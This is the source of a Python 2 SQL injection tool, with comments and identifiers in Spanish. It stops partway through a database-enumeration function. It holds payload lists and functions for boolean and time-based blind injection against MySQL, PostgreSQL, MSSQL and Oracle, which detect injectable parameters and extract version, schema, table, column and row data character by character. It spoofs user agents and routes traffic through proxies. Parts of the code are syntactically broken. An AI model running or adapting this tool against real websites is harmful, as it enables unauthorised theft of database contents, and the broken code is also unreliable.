#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit
from random import choice
from random import random
from random import randint
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
from datetime import datetime
from urllib import unquote
import socks
import os
class Injection:
	Agentes={
	'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
	'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
	'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
	'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
	'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
	'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}
	cabeceras={}
	proxy={}
	cookies = {}
	datos={}
	method = -1 # True = Get method # False = Post method
	server=""
	based=""
	time = "0.5"
	pref = ""
	suf = ""
	manejador = ""
	sufijos = ['#','/*','//','-- a',';','-- -+']
	#prefijos = ["'","';",'//','-- a',';']
	Prefijos = [
				"'",#"''", #Simple Quotes
				" ", ";",
				"')","'))","')))", #Simple Quotes with Parentheses
				'"','""',
				'")','"))','")))',
				"';","'';", #Simple Quotes semi colon
				"');","'));","')));", #Simple Quotes with Parentheses semi colon
				'";','"";',
				'");','"));','")));',
				"%'",'%"' #Comodines
				]
	Sufijos={
		#'MySQL':[' ','#','-- -a'," and '%'='"],
		'Generic':['--','-- -+',""],
		'mysql':['#','-- -+',""],
		'pgsql':['-- -a',""],
		'mssql':['-- -+',""],
		'oracle':['from dual;',""]
	}
	Intentos={
		'mysql':[r"' or 4=4"] 
	}
	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	catalogo={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQL={
		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , "-- -+"],
		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT column_name FROM information_schema.columns "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",")"]

	}		

	catalogoPostgres={
		'version':["' and   ascii(substring((select version()),1,1))" , "'" , "and   ascii(substring((select version())," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT datname FROM pg_database limit 1 offset " , "))" , "-- -+"],
		'current':["' and   ascii(substring((SELECT current_database()),1,1))" , "'" , "and   ascii(substring((SELECT current_database())," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))"]
	}
	catalogoMSSQL={
		'version':["' and   ascii(substring(@@version,1,1))" , "'" , "and   ascii(substring(@@version," , "))" , "-- -+"],
		'bases':["lol" , "'" , "AND ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM master..sysdatabases offset) x WHERE x.RowNo = " , "))" , "-- -+"],
		'current':["' and   ascii(substring(database(),1,1))" , "'" , "and   ascii(substring((SELECT DB_NAME())," , "))" , "-- -+"],
		'tablas':["'" , " and   ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM "  ,  "..sysobjects offset WHERE xtype = 'U') x WHERE x.RowNo = "  ,"))" , "-- -+"],
		'columnas':["'" , " and   ascii(substring((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME ASC) AS RowNo,COLUMN_NAME FROM  "  ,  ") x WHERE x.RowNo = "  ,"))" , "-- -+"],
		'datos':["'" , " and   ascii(substring((SELECT CAST((SELECT " , " # FROM (SELECT ROW_NUMBER() OVER (ORDER BY $ ASC) AS RowNo,# FROM "  ,  " offset) x WHERE x.RowNo = "  ,"))" , "-- -+",") AS varchar))"]
	}
	catalogoOracle={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQLBlind={
#		'version':["'and IF(ascii(substring((SELECT username from user where id = 1),1,1))>1,sleep(10),0)=0-- -+" , "'" , "and   IF(ascii(substring(@@version," , "))" , ",sleep(1),0)=0","-- -+"],
		'version':["LMAO" , "'" , "and   IF(ascii(substring(@@version," , "))" , ",sleep(0.5),0)=0","-- -+","",",sleep(#),0)=0"],
		'bases':["lol" , "'" , "AND IF(ascii(substring((SELECT schema_name FROM information_schema.schemata limit 1 offset " , "))" , ",sleep(0.5),0)=0","-- -+","",",sleep(#),0)=0"],
		'current':["' and   IF(ascii(substring(database(),1,1))" , "'" , "and   ascii(substring(database()," , "))" , ",sleep(0.5),0)=0-- -+","",",sleep(0.5),0)=0",",sleep(#),0)=0"],
		'tablas':["'" , " and   IF(ascii(substring((SELECT table_name FROM information_schema.tables "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0","-- -+",",sleep(0.5),0)=0",",sleep(#),0)=0"],
		'columnas':["'" , " and   IF(ascii(substring((SELECT column_name FROM information_schema.columns "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0","-- -+",",sleep(0.5),0)=0",",sleep(#),0)=0"],
		'datos':["'" , " and   IF(ascii(substring((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , ",sleep(0.5),0)=0",")",",sleep(#),0)=0"],
		'manejador':["mysql"]

	}		

	catalogoPostgresBlind={
		'version':["lol 1" , "';" , "select case when(ascii(substring((select version())," , "))" , "-- -+", "", "", ") then pg_sleep(#) END"],
		'bases':["lol" , "';" , "select case when(ascii(substring((SELECT datname FROM pg_database limit 1 offset " , "))" , "-- -+","","",") then pg_sleep(#) END"],
		'current':["" , "';" , "select case when(ascii(substring((SELECT current_database())," , "))" , "-- -+","","",") then pg_sleep(#) END"],
		'tablas':["';" , " select case when(ascii(substring((SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r''') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid) "  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(#) END"],
		'columnas':["';" , " select case when(ascii(substring((SELECT A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE 'public') and relname = '"  ,  "limit 1 offset "  ,"))" , "-- -+","","",") then pg_sleep(#) END"],
		'datos':["';" , " select case when(ascii(substring((cast((SELECT " , " FROM "  ,  "limit 1 offset "  ,"))" , "-- -+",") as varchar))",") then pg_sleep(#) END"],
		'manejador':["pgsql"]

	}
	catalogoMSSQLBlind={
		'version':["" , "';" , " if (ascii(substring(@@version," , "))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'bases':["lol" , "';" , "if (ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM master..sysdatabases offset) x WHERE x.RowNo = " , "))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'current':["' and   ascii(substring(database(),1,1))" , "';" , "if (ascii(substring((SELECT DB_NAME())," , "))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'tablas':["';" , " if (ascii(substring((SELECT name FROM (SELECT ROW_NUMBER() OVER (ORDER BY name ASC) AS RowNo,name FROM "  ,  "..sysobjects offset WHERE xtype = 'U') x WHERE x.RowNo = "  ,"))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'columnas':["'" , " if (ascii(substring((SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME ASC) AS RowNo,COLUMN_NAME FROM  "  ,  ") x WHERE x.RowNo = "  ,"))" , "-- -+", "", "", ") waitfor delay '00:00:#'"],
		'datos':["'" , " if (ascii(substring((SELECT CAST((SELECT " , " # FROM (SELECT ROW_NUMBER() OVER (ORDER BY $ ASC) AS RowNo,# FROM "  ,  " offset) x WHERE x.RowNo = "  ,"))" , "-- -+",") AS varchar))", ") waitfor delay '00:00:#'"],
		'manejador':["mssql"]
	}
	catalogoOracleBlind={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	notautos=['and 1=0-- -+']
	SentHeaders = ""
	respuesta = ""
	NoAleatorio = int(random()*100)
	verbosity = False
	error = ""
	errorT = False

	PayloadsAttempt={ # Theses payloads are used in the SQLi blind detection
					  # And we just used specific functions in which DBMS works
	
	'mysql':[
				  'and ascii(substring({0},1,1))={1}'.format(chr(randint(48,126)),ord(chr(randint(48,126)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
				  'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
				  '&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
				  #Specific queries
				  #'&& (select @@version)',
				  'and (select database())'
				  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
				  ],
	'pgsql':[
				  #'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
				  'and (select current_database())',
				  #'and (select user)',
				  'and trunc(random() * cast(random()*1291 as int) - 1)>0',
				  'and ascii(substring(@@version,1,1))=ascii("P")'
				  'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
				],
	'mssql':[
				"and (PI()* SQUARE(rand())) < {0}".format(randint(10,99)),
				"and (cast('{0}' as integer)) = (cast('{0}' as integer)) and (PI()) like '%3%'".format(randint(1,154)),
				"and CONVERT(varchar, SERVERPROPERTY('productversion')) like '%.%'",
				"and (atn2(rand(),rand()*rand())) < rand()*{0}".format(randint(10,99)),
				"and (LEN(host_name())>0)"
			],
	'oracle':['and select @@version from dual']
			}

	PayloadsAttemptTime={ # Theses payloads are used in the SQLi blind detection
					  # And we just used specific functions in which DBMS works
	'mysql':[
				'and IF(1=1,sleep(2),0)=0',
				'and ascii(substring({0},1,1))={1}'.format(chr(randint(48,126)),ord(chr(randint(48,126)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
				'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
				'&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
				#Specific queries
				#'&& (select @@version)',
				],
	'pgsql':[
				  "select case when (select 11=11) then pg_sleep(2) else 'e' end",
				  'select case when(1=1) then pg_sleep(2) end'

			  	  
				],
	'mssql':[
				" if 1=1 waitfor delay '00:00:02'",
				"and (cast('{0}' as integer)) = (cast('{0}' as integer)) and (PI()) like '%3%'".format(randint(1,154)),
				"and CONVERT(varchar, SERVERPROPERTY('productversion')) like '%.%'",
				"and (atn2(rand(),rand()*rand())) < rand()*{0}".format(randint(10,99)),
				"and (LEN(host_name())>0)"
			],
	'oracle':['and select @@version from dual']
			}

	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setVerbosity(self,simon):
		self.verbosity = simon
			
	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		galleta = galleta.split(';')
		for value in galleta:
			self.cookies.update({value.split('=')[0]:value.split('=')[1]})

	def setBased(self,based):
		#self.cookie.update({""})
		self.based = based
		
	def setTime(self,time):
		#self.cookie.update({""})
		self.time = time

	def setError(self,error):
		#self.cookie.update({""})
		self.error = error
		self.errorT = True

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = self.proxy = {"http":proxy}
			
	def showData(self,lll="",Previo=False,vulnerable=False,objeto=""):
		if Previo:
			try:
				previous = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
				print "DBMS",previous.split(':::')[2],"\n"
				print "-"*56
				print ":"*20,"Data Requested",":"*20
				print "-"*56
				print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(previous.split(':::')[1],previous.split(':::')[0])
				print previous.split(':::')[5],"\033[0m\n"
			except:
				print "not vulnerable"
		else:
			print "-"*140
			print ":"*60,"Client Request",":"*60l
			print "-"*140
			#print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(self.GoodRequest.request.method,self.GoodRequest.request.path_url)
			# Cambiar objeto por self.GoodRequest
			print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(objeto.request.method,objeto.request.path_url)
			for h in objeto.request.headers: print "\033[1;35m"+h,":",objeto.request.headers.get(h)+"\033[0m"
			print "\n\033[1;36m",lll,"\033[0m\n\033[0m"
			print "-"*140
			print ":"*60,"Server Response",":"*60
			print "-"*140
			for i in objeto.headers: print "\033[1;35m"+i,":",objeto.headers.get(i)+"\033[0m"
			####
			## This section will write successfull data to file
			if vulnerable:# and Previo:
				if not Previo:
					try:
						sss = open(self.fullPath+"/"+self.succesfullQuery,"w")
																			#################################################
																			# 	Format to use when write in a file as csv 	#
																			#   url, method, dbms, prefix, sufix, request   #
																			#################################################
						sss.write("{0}:::{1}:::{2}:::{3}:::{4}:::{5}".format(self.GoodRequest.url.__str__(), self.GoodRequest.request.method, self.Which, self.prefixSuccess,self.suffixSuccess,lll))
						sss.close()
					except:
						print ""
			elif not vulnerable:
				print "Bye"
				exit(1)

			
	@staticmethod
	def defBase(obj):
		consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if obj.verbosity:
			obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(pref+querys+suf)))
		if obj.based == "error":
			for manejadores in obj.PayloadsAttempt.keys():
				for querys in obj.PayloadsAttempt[manejadores]:
					for pref in obj.Prefijos:
						for suf in obj.Sufijos[manejadores]:
							#obj.prefSuf(obj,tipo)
							#print manejadores
							#print "prefijo:"+pref
							#print "sufijo:"+suf
							
							consulta2 = requests.get(url=obj.server+pref+" "+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
							if obj.verbosity:
								obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(pref+querys+suf)))

							#print obj.server+pref+querys+suf
							if consulta.text == consulta2.text:
								obj.pref = pref
								obj.suf = suf
								obj.manejador = manejadores
								#print "!"+pref +" _______"+ suf+"!"
								#print "consulta:"+consulta.content
								#print "consulta2:"+consulta2.content
								return
		elif obj.based == "time":
			consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			if obj.verbosity:
				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server)))
			for manejadores in obj.PayloadsAttemptTime.keys():
				for querys in obj.PayloadsAttemptTime[manejadores]:
					for pref in obj.Prefijos:
						for suf in obj.Sufijos[manejadores]:
							#obj.prefSuf(obj,tipo)
							#print "prefijo:"+pref
							#print "sufijo:"+suf
							#print "	queryssss",querys
							
							consulta2 = requests.get(url=obj.server+" "+pref+querys+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
							if obj.verbosity:
								obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(obj.server+pref+querys+suf)))
							#print "!",consulta.elapsed.total_seconds()
							#print consulta2.elapsed.total_seconds()
							#if consulta.text == consulta2.text and (consulta2.elapsed.total_seconds() > 10):
							if (consulta2.elapsed.total_seconds() > 2):
								obj.pref = pref
								obj.suf = suf
								obj.manejador = manejadores
								#print "!"+pref + suf+"!"
								return


	# @staticmethod
	# def prefSuf(obj,tipo):

	# 	for pref in obj.Prefijos:
	# 		for suf in obj.Sufijos[tipo]:
	# 			if obj.based == "error":
	# 				consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
	# 				if obj.verbosity:
	# 					obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server)))
	# 				consulta2 = requests.get(url=obj.server+pref+" and 1=1"+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
	# 				if obj.verbosity:
	# 					obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(obj.server+pref+" and 1=1"+suf)))
	# 				if consulta.text == consulta2.text:
	# 					obj.pref = pref
	# 					obj.suf = suf
	# 					#print "!"+suf + pref+"!"
	# 					return
	# 			elif obj.based == "time":
	# 				consulta = requests.get(url=obj.server,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
	# 				if obj.verbosity:
	# 					obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(obj.server)))
	# 				if tipo == "mysql":
	# 					#print "entrp"+pref+suf
	# 					consulta2 = requests.get(url=obj.server+pref+" and IF(1=1,sleep(1),0)=0"+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
	# 					if obj.verbosity:
	# 						obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(consulta2.request.body)))
	# 					if consulta.text == consulta2.text and consulta2.elapsed.total_seconds() > 2:
	# 						obj.pref = pref
	# 						obj.suf = suf
	# 						#print "!"+suf + pref+"!"
	# 						return
	# 				elif tipo == "pgsql":
	# 					consulta2 = requests.get(url=obj.server+pref+" select case when(1=1) then pg_sleep(2) end"+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
	# 					if self.verbosity:
	# 						self.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(consulta2.request.body)))
	# 					if consulta.text == consulta2.text and consulta2.elapsed.total_seconds() > 2:
	# 						obj.pref = pref
	# 						obj.suf = suf
	# 						#print "!"+suf + pref+"!"
	# 						return
	# 				elif tipo == "mssql":
	# 					consulta2 = requests.get(url=obj.server+pref+" if 1=1 waitfor delay '00:00:02'"+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
	# 					if self.verbosity:
	# 						self.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(consulta2.request.body)))
	# 					if consulta.text == consulta2.text and consulta2.elapsed.total_seconds() > 2:
	# 						obj.pref = pref
	# 						obj.suf = suf
	# 						#print "!"+suf + pref+"!"
	# 						return
	# 				elif tipo == "oracle":
	# 					consulta2 = requests.get(url=obj.server+pref+" and 1=1"+suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
	# 					if self.verbosity:
	# 						self.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(consulta2.request.body)))
	# 					if consulta.text == consulta2.text and consulta2.elapsed.total_seconds() > 2:
	# 						obj.pref = pref
	# 						obj.suf = suf
	# 						#print "!"+suf + pref+"!"
	# 						return
					
					


	@staticmethod
	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		
		
		caracter = chr(Injection.getMid(up,down))
		#print "up: ",up," car: ",ord(caracter)," down:",down
		if tipo == "version" and based == "error":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "bases"  and based == "error":
			coord = str(columna)+"),"+str(fila)+",1"
			direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "current"  and based == "error":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "tablas"  and based == "error":
			coord = "," + str(fila)+",1"
			direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "columnas"  and based == "error":
			coord = "," + str(fila)+",1"
			direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "datos"  and based == "error":
			coord = "," + str(fila)+",1"
			direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"

		elif tipo == "version" and based == "time":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]
			#print direccion
			#+">"+str(ord(caracter))+"-- -+"
		elif tipo == "bases"  and based == "time":
			coord = str(columna)+"),"+str(fila)+",1"
			direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "current"  and based == "time":
			coord = str(fila)+","+str(columna)
			direccion = obj.server+obj.pref+manejador[tipo][2]+coord+manejador[tipo][3]
		elif tipo == "tablas"  and based == "time":
			coord = "," + str(fila)+",1"
			direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "columnas"  and based == "time":
			coord = "," + str(fila)+",1"
			direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][2]+str(columna)+")"+coord+manejador[tipo][3]
			#print " Consulta 2:"+direccion+">"+str(ord(caracter))+"-- -+"
		elif tipo == "datos"  and based == "time":
			coord = "," + str(fila)+",1"
			direccion = obj.server+obj.pref+manejador[tipo][1]+where+manejador[tipo][3]+str(columna)+manejador[tipo][6]+coord+manejador[tipo][4]

		#print "Coordenada: "+coord
		#print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"
		# consulta = requests.get(url=direccion+"=NULL-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		# if consulta.text == ok:
		# 	return ""
		if based == "error":

			consulta = requests.get(url=direccion+"="+str(ord(caracter))+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			
			if obj.verbosity:
				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(direccion+"="+str(ord(caracter))+obj.suf)))
			if tipo == "bases":
				print direccion+"="+str(ord(caracter))+obj.suf
			if consulta.text == ok:
				return caracter

			if errorT == False:
				condicion 
			elif errorT == True:

			elif (consulta.text != ok) and (up == down ):
				#print "OMG"
				return "No encontrado"
			else:
				

				consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(direccion+">"+str(ord(caracter))+obj.suf)))
				if tipo == "bases":
					print direccion+"="+str(ord(caracter))+obj.suf
				#consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+manejador[tipo][7]+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)

					
				if consulta2.text == ok:
					#print "iguales"
					#print "up: ",up," down(car): ",ord(caracter)
					#print ""
					return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where,obj.based)
				else:
					#print "up(car): ",ord(caracter)," down:",down
					#print ""
					down2=down
					if (down2 + 1) == ord(caracter):
						return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where,obj.based)
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna,where,obj.based)


		elif based == "time":
			tiempo = str(obj.time)
			espera = tiempo
			#print tiempo
			try:
				if manejador["manejador"][0]=="mssql" and len(str(obj.time)) == 1:
					#print manejador["manejador"][0]
					tiempo = "0"+str(obj.time)
				elif manejador["manejador"][0]=="mysql":
					#print manejador["manejador"][0]
					tiempo = str(float(obj.time)/2)
				elif manejador["manejador"][0]=="pgsql":
					#print manejador["manejador"][0]
					tiempo = str(obj.time)
					#print obj.time
					#print int(obj.time)

					#print tiempo + ":mysql tiempo"
					#print espera + ":espera"
			except Exception, e:
				print e
				#print "lol"
			consulta = requests.get(url=direccion+"="+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			if obj.verbosity:
				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(direccion+"="+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf)))
			
			#print consulta.elapsed.seconds
			#if tipo == "t2ablas":
				#print direccion+"="+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf
			#print "Consulta.text=("+consulta.text+") elapsed:"+str(consulta.elapsed.seconds)+" up y down"+str(up)+"   "+str(down)
			#print "elapsed"+str(consulta.elapsed.total_seconds())+" espera:"+str(float(espera))
			#print "<<<<<<",consulta.elapsed.total_seconds()# > float(espera)
			#if consulta.text == ok and consulta.elapsed.total_seconds() > float(espera):
			if consulta.elapsed.total_seconds() > float(espera):
				return caracter

				
			elif consulta.elapsed.total_seconds() < float(espera) and (up == down ):
				return "No encontrado"
			else:
				
				
				
				consulta2 = requests.get(url=direccion+">"+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(direccion+">"+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf)))
				#if tipo == "ta2blas":
					#print "\n\n\n "+direccion+">"+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf
				#print "else Consulta.text=("+consulta2.text+") elapsed:"+str(consulta2.elapsed.seconds)
					
				#if consulta2.text == ok and consulta2.elapsed.total_seconds() > float(espera):
				if  consulta2.elapsed.total_seconds() > float(espera):
					#print "iguales"
					#print "up: ",up," down(car): ",ord(caracter)
					#print ""
					return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where,obj.based)
				else:
					#print "up(car): ",ord(caracter)," down:",down
					#print ""
					down2=down
					if (down2 + 1) == ord(caracter):
						return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where,obj.based)
						#print consulta.elapsed.seconds
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna,where,obj.based)
	
	
	
	@staticmethod
	def getVersion(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		version = ""
		char = ""
		indiceY = 1
		indiceX = 0
		while char != "No encontrado":
		 	char =obj.busqueda(obj,manejador,"version",ok,126,32,indiceY,1,"",obj.based)
		 	#print "Caracter: "+char
		 	if char != "No encontrado":
		 		version += char
		 		indiceY = indiceY +1
		return version
		
	@staticmethod
	def getBases(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		indiceY	= 1
		indiceX = 0
		char = "No encontrado"
		if tipo == "mssql":
			indiceX = 1
		bandera = 0
		base = ""
		bases = {}
		while char == "No encontrado" and bandera != 1:
			char = ""
			while char != "No encontrado":
				
